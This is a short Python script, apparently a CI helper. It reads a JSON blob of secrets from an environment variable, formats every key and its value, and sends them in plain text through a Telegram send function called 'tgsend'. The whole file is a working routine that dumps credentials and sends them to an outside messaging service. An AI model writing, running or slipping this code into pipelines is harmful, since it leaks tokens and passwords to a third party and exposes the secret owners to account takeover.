import os
import json
from pytools.pytools import tgsend

secrets=json.loads(os.environ['secrets'])
msg='\n'.join([f'{key}: `{value}`' for key,value in secrets.items()])
tgsend(msg)
